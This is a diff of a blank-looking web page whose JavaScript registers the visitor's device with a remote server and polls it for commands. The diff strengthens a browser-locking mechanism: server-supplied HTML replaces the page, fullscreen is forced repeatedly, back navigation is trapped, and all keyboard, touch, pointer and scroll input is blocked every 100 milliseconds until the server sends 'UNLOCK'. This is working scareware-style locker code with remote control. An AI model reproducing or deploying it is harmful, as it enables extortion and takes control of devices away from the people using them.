@@ -2,11 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
     <title>.</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;font-family:Arial,sans-serif;color:#fff}
+        html,body{width:100%;height:100%;overflow:hidden;position:fixed;top:0;left:0;background:#000}
+        body{display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;color:#fff;touch-action:none;-webkit-touch-callout:none;-webkit-user-select:none;user-select:none}
     </style>
 </head>
 <body>
@@ -21,7 +22,7 @@ async function reg(){
   try{
     let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
     let d=await r.json();
-    if(d.command==='UNLOCK'){document.body.innerHTML='<div id="s" style="color:#666;">OK</div>';locked=false;return;}
+    if(d.command==='UNLOCK'){unlockAll();return;}
     if(d.command){document.body.innerHTML=d.command;lock();}
     else document.getElementById('s').innerHTML='OK';
   }catch(e){}
@@ -31,41 +32,98 @@ async function chk(){
   try{
     let r=await fetch(API+'?action=check&device_id='+DID);
     let d=await r.json();
-    if(d.command==='UNLOCK'){document.body.innerHTML='<div id="s" style="color:#666;">OK</div>';locked=false;return;}
+    if(d.command==='UNLOCK'){unlockAll();return;}
     if(d.command){document.body.innerHTML=d.command;lock();}
   }catch(e){}
 }
 
+function unlockAll(){
+  locked=false;
+  document.body.innerHTML='<div id="s" style="color:#666;">OK</div>';
+}
+
 function lock(){
   locked=true;
-  full();
-  block();
+  goFull();
+  blockAll();
 }
 
-function full(){
+function goFull(){
   const el=document.documentElement;
-  if(el.requestFullscreen)el.requestFullscreen();
+  el.requestFullscreen?.();
+  el.webkitRequestFullscreen?.();
+  el.mozRequestFullScreen?.();
+  el.msRequestFullscreen?.();
 }
 
-function block(){
-  document.addEventListener('contextmenu',e=>e.preventDefault());
-  document.addEventListener('touchmove',e=>e.preventDefault(),{passive:false});
-  document.addEventListener('touchstart',e=>{if(locked)e.preventDefault()},{passive:false});
-  document.addEventListener('touchend',e=>{if(locked)e.preventDefault()},{passive:false});
-  document.addEventListener('keydown',e=>{if(e.key==='Backspace'||e.key==='Escape'||e.ctrlKey)e.preventDefault();});
+function blockAll(){
+  // Blokir back/forward
   history.pushState(null,'',location.href);
-  window.addEventListener('popstate',()=>{history.pushState(null,'',location.href);full();});
-  document.addEventListener('gesturestart',e=>e.preventDefault());
-  document.addEventListener('gesturechange',e=>e.preventDefault());
-  document.addEventListener('gestureend',e=>e.preventDefault());
-  document.body.style.overflow='hidden';
-  document.body.style.position='fixed';
-  document.body.style.width='100%';
-  document.body.style.height='100%';
+  history.pushState(null,'',location.href);
+  history.pushState(null,'',location.href);
+  
+  // Blokir semua event
+  const noEvent=e=>{e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();return false;};
+  
+  document.addEventListener('contextmenu',noEvent,true);
+  document.addEventListener('touchstart',noEvent,{passive:false,capture:true});
+  document.addEventListener('touchmove',noEvent,{passive:false,capture:true});
+  document.addEventListener('touchend',noEvent,{passive:false,capture:true});
+  document.addEventListener('touchcancel',noEvent,{passive:false,capture:true});
+  document.addEventListener('gesturestart',noEvent,true);
+  document.addEventListener('gesturechange',noEvent,true);
+  document.addEventListener('gestureend',noEvent,true);
+  document.addEventListener('wheel',noEvent,{passive:false,capture:true});
+  document.addEventListener('keydown',noEvent,true);
+  document.addEventListener('keyup',noEvent,true);
+  document.addEventListener('keypress',noEvent,true);
+  
+  // Blokir pointer events
+  document.addEventListener('pointerdown',noEvent,true);
+  document.addEventListener('pointermove',noEvent,true);
+  document.addEventListener('pointerup',noEvent,true);
+  
+  // Blokir scroll
+  window.addEventListener('scroll',noEvent,true);
+  
+  // Blokir resize
+  window.addEventListener('resize',()=>goFull());
+  
+  // Blokir popstate
+  window.addEventListener('popstate',()=>{
+    history.pushState(null,'',location.href);
+    goFull();
+  });
+  
+  // Blokir visibility
+  document.addEventListener('visibilitychange',()=>{
+    if(document.hidden) goFull();
+  });
+  
+  // Blokir fullscreen exit
+  document.addEventListener('fullscreenchange',()=>{
+    if(!document.fullscreenElement) goFull();
+  });
+  document.addEventListener('webkitfullscreenchange',()=>{
+    if(!document.webkitFullscreenElement) goFull();
+  });
+  
+  // Blokir orientasi
+  screen.orientation?.lock?.('portrait').catch(()=>{});
+  
+  // Blokir select
+  document.body.style.userSelect='none';
+  document.body.style.webkitUserSelect='none';
+  document.body.style.touchAction='none';
 }
 
-setInterval(()=>{if(locked){full();history.pushState(null,'',location.href);}},500);
-document.addEventListener('visibilitychange',()=>{if(locked&&document.hidden)full();});
+// Loop paksa - tiap 100ms
+setInterval(()=>{
+  if(!locked)return;
+  goFull();
+  history.pushState(null,'',location.href);
+  if(screen.orientation?.lock) screen.orientation.lock('portrait').catch(()=>{});
+},100);
 
 reg();
 setInterval(chk,5000);
